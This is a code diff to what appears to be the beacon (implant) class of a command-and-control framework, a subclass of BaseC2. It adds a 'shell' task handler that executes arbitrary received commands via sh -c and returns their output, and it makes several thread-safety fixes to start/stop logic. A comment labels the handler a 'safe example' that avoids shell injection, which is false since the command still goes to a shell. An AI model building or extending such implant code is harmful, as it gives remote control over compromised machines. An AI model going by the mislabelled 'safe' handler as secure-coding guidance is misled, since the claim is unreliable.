@@ -91,8 +91,26 @@ class Beacon(BaseC2):
         )
         beacon = Beacon(config)
 
-        # 注册任务处理器
-        beacon.register_handler('shell', lambda cmd: os.popen(cmd).read())
+        # 注册任务处理器 (安全示例 - 使用subprocess而非os.popen)
+        def safe_shell_handler(cmd: str) -> str:
+            '''安全的shell命令处理器'''
+            import subprocess
+            import shlex
+            try:
+                # 使用列表形式调用，避免shell注入
+                result = subprocess.run(
+                    cmd if isinstance(cmd, list) else ['sh', '-c', cmd],
+                    capture_output=True,
+                    text=True,
+                    timeout=60
+                )
+                return result.stdout[:10000]  # 限制输出大小
+            except subprocess.TimeoutExpired:
+                return "[Error] Command timeout"
+            except Exception as e:
+                return f"[Error] {e}"
+
+        beacon.register_handler('shell', safe_shell_handler)
 
         # 启动 Beacon
         beacon.start()
@@ -318,6 +336,9 @@ class Beacon(BaseC2):
 
         Returns:
             True 如果 Beacon 正在运行或正在启动中
+
+        Note:
+            此方法在锁内原子地检查所有状态，避免 TOCTOU 问题
         """
         with self._state_lock:
             # 正在启动中也算运行
@@ -325,9 +346,12 @@ class Beacon(BaseC2):
                 return True
             if not self._running:
                 return False
-            if not self._thread:
+            # 缓存线程引用并在锁内检查
+            thread = self._thread
+            if thread is None:
                 return False
-            return self._thread.is_alive()
+            # 在锁内检查线程状态
+            return thread.is_alive()
 
     def _request_stop(self) -> None:
         """请求停止（线程安全）"""
@@ -405,14 +429,32 @@ class Beacon(BaseC2):
             self._stop_event.set()
 
     def stop(self) -> None:
-        """停止 Beacon"""
-        # 请求停止
-        self._request_stop()
+        """
+        停止 Beacon（线程安全）
 
-        # 获取线程引用（在锁内）
+        处理多种状态：
+        1. 正在启动中 (_starting=True) - 通过stop_event中断
+        2. 正在运行 (_running=True) - 正常停止
+        3. 已停止 - 无操作
+        """
+        # 首先设置停止标志，中断任何等待操作
         with self._state_lock:
+            was_starting = self._starting
+            was_running = self._running
+            self._running = False
+            self._starting = False
+            self._stop_event.set()
             thread = self._thread
             self._thread = None
+
+        # 如果正在启动中，等待启动锁释放
+        if was_starting:
+            # 尝试获取启动锁以确保启动流程已结束
+            acquired = self._startup_lock.acquire(timeout=2.0)
+            if acquired:
+                self._startup_lock.release()
+            else:
+                logger.warning("Timeout waiting for startup to complete")
 
         # 等待线程结束（在锁外）
         if thread and thread is not threading.current_thread():
@@ -422,7 +464,9 @@ class Beacon(BaseC2):
 
         # 断开连接
         self.disconnect()
-        logger.info("Beacon stopped")
+
+        if was_running or was_starting:
+            logger.info("Beacon stopped")
 
     def run(self) -> None:
         """同步运行 Beacon（阻塞）"""
@@ -436,10 +480,19 @@ class Beacon(BaseC2):
         finally:
             self.stop()
 
-    def run_async(self) -> threading.Thread:
-        """异步运行 Beacon"""
+    def run_async(self) -> Optional[threading.Thread]:
+        """
+        异步运行 Beacon
+
+        Returns:
+            启动成功返回线程对象，失败返回 None
+        """
         self.start()
-        return self._thread
+        with self._state_lock:
+            # 确保线程已成功创建并运行
+            if self._thread and self._thread.is_alive():
+                return self._thread
+            return None
 
     def _beacon_loop(self) -> None:
         """Beacon 主循环"""
